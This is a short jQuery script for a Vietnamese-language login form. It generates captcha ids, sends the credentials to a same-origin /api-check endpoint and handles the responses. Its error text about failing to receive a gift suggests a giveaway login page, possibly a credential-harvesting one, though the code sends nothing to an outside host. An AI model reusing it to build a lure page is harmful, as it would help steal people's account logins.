 var captchaGenerate = function() {
        var b = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(a) {
            var b = 16 * Math.random() | 0;
            return ("x" == a ? b : b & 3 | 8).toString(16)
        }).replace(/-/g, "");
        $("#captcha-key").val(b);
        $("#captcha-img").attr("src", "/captcha.php?id=" + b)
    },
    refreshCaptcha = function() {
        $(".refresh").click(function() {
            captchaGenerate()
        })
    },
    loginHandle = function() {
        $("#login-form").submit(function(b) {
            $.ajax({
                method: "POST",
                url: "/api-check",
                data: $(this).serialize(),
                dataType: "json",
                beforeSend: function() {
                    $("#confirm-btn").val("\u0110ang \u0111\u0103ng nh\u1eadp...").attr("disabled", !0)
                },
                complete: function() {
                    $("#confirm-btn").val("\u0110\u0103ng nh\u1eadp ngay").removeAttr("disabled");
                    captchaGenerate()
                }
            }).done(function(a) {
                "error_require_captcha" == a.status ? ($("#sso_captcha_wrap").show(), $("#input-captcha").attr("required", !0)) : "success" == a.status ? location.href = '/' : swal("Th\u00f4ng b\u00e1o", a.message || "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", "error")
            }).fail(function() {
                swal("Th\u00f4ng b\u00e1o", "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", "error").then(function() {
                    location.reload()
                })
            });
            b.preventDefault()
        })
    };
              

    
$(document).ready(function() {
    loginHandle();
    captchaGenerate();
    refreshCaptcha()
});